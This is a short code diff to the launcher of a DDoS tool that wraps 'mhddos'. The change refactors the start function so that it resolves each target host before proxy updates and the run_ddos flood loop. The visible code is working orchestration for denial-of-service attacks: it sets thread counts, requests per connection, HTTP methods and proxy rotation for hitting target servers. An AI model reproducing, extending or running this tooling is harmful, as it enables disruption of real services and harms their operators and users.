@@ -151,13 +151,15 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug)
     time.sleep(period + 3)
 
 
-def start(total_threads, period, targets, rpc, http_methods, vpn_mode, debug):
+def start(total_threads, period, targets_iter, rpc, http_methods, vpn_mode, debug):
     os.chdir('mhddos')
     while True:
-        resolved = list(targets)
-        if not resolved:
+        targets = list(targets_iter)
+        if not targets:
             logger.error('Must provide either targets or a valid config file')
             exit()
+        for target in targets:
+            resolve_host(target)
 
         if rpc < LOW_RPC:
             logger.warning(
@@ -165,10 +167,10 @@ def start(total_threads, period, targets, rpc, http_methods, vpn_mode, debug):
                 f'через збільшення кількості перемикань кожного потоку між проксі.'
             )
 
-        no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in resolved)
+        no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
         if not no_proxies:
-            update_proxies(period, resolved)
-        run_ddos(resolved, total_threads, period, rpc, http_methods, vpn_mode, debug)
+            update_proxies(period, targets)
+        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug)
 
 
 def init_argparse() -> argparse.ArgumentParser:
